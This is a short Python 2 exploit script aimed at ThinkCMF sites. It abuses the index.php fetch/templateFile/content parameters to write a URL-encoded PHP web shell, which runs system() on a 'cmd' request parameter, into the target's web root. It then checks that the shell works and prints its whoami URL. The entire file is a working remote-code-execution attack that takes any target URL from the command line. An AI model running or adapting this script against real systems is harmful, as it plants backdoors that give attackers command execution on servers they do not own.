
import requests,sys,json

def ThinkCMF_getshell(url):
    if url[-1] == '/':
        url = url[0:-1]
    else:
        url = url
    vuln_url = url + R'''/index.php?a=fetch&templateFile=public/inde&prefix=%27%27&content=<php>file_put_contents('0a30e0d61182dbb7c1eed5135787fb84.php','%3c%3f%70%68%70%0d%0a%65%63%68%6f%20%6d%64%35%28%22%54%68%69%6e%6b%43%4d%46%22%29%3b%0d%0a%20%20%20%20%69%66%28%69%73%73%65%74%28%24%5f%52%45%51%55%45%53%54%5b%22%63%6d%64%22%5d%29%29%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%65%63%68%6f%20%22%3c%70%72%65%3e%22%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%24%63%6d%64%20%3d%20%28%24%5f%52%45%51%55%45%53%54%5b%22%63%6d%64%22%5d%29%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%73%79%73%74%65%6d%28%24%63%6d%64%29%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%65%63%68%6f%20%22%3c%2f%70%72%65%3e%22%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%64%69%65%3b%0d%0a%20%20%20%20%7d%0d%0a%70%68%70%69%6e%66%6f%28%29%3b%0d%0a%3f%3e')</php>'''
    r = requests.get(vuln_url)
    response_str = json.dumps(r.headers.__dict__['_store'])
    if r.status_code == 200 and 'PHP' in response_str:
        print r.headers.get('Server')
        print r.headers.get('X-Powered-By')
        check_shell(url)
    else:
        print "No Exit ThinkCMF Vuln"

def check_shell(url):
    shell_url = url + '/0a30e0d61182dbb7c1eed5135787fb84.php'
    r = requests.get(shell_url)
    if r.status_code == 200 and '0a30e0d61182dbb7c1eed5135787fb84' in r.content:
        print "\n>>>>>>>Shell url:"
        print url + "/0a30e0d61182dbb7c1eed5135787fb84.php?cmd=whoami"
        # print url + "/0a30e0d61182dbb7c1eed5135787fb84.php?cmd=rm -rf 0a30e0d61182dbb7c1eed5135787fb84.php"

if __name__ == '__main__':
    if len(sys.argv) != 2:
        sys.exit("\n[+] python %s http://x.x.x.x/" % sys.argv[0])
    else:
        url = sys.argv[1]
        ThinkCMF_getshell(url)

